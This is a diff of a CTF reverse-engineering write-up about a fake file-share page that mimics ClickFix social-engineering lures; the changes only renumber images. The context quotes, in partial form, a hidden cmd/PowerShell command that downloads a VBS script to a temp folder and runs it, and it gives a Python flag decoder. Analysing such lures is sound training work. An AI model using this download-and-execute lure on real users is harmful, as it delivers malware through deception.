@@ -18,21 +18,21 @@ Category: Reverse Engineering (Easy)
 
 Navigating to the link, we are first met with this legitimate-looking link verification page, before we're forwarded to the actual page.
 
-<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
 
 The initial page that was shown with the 5 seconds redirect timer is actually a legitimate measure implemented by Singapore's Government to protect individuals from being phished when they click on a supposedly-government link. The actual page appears like this
 
-<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
 
 And will contain this header at the top
 
-<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
 
 Going back to the challenge, we can see that the page is claiming that we're being shared a file flag.txt by BlahajCTF, and that to access it, all we have to do is to copy the URL and paste it into File Explorer. If we were to follow these instructions, we would be met with the following warning message.
 
-<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
 
 If we paste the URL into a text editor, we can see the full command being executed.
 
@@ -44,7 +44,7 @@ cmd.exe /c start /min powershell.exe -ep bypass -C "Invoke-WebRequest http://rev
 
 This is akin to the "Fake Captcha" social engineering campaigns that pop up from time to time (a blog discussing this attack can be found [here](https://www.splunk.com/en_us/blog/security/unveiling-fake-captcha-clickfix-attacks.html)), where the user is instructed to open their Run menu and paste in the contents of their clipboard, before running the contents to verify that they are not a bot. Here, the code snippet uses PowerShell to download a file "<mark style="color:red;">update.vbs</mark>" and save it to <mark style="color:red;">C:\Windows\Temp\LOVELETTERFORYOU.vbs</mark>, then execute the VBS script with <mark style="color:red;">WScript.exe</mark>. We can curl the website to get the second stage script ourselves, and continue reversing this malware.
 
-<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
 
 This VBS code checks if the current system time is set to a specific datetime, and if not it will display the warning message we saw earlier. If it is, it will attempt to decode the encoded flag by increasing or decreasing its ASCII value. We can easily reverse this using the following Python script
 
@@ -66,7 +66,7 @@ for char in encoded_flag:
 print(decoded)
 ```
 
-<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
 
 ## Conclusion
 
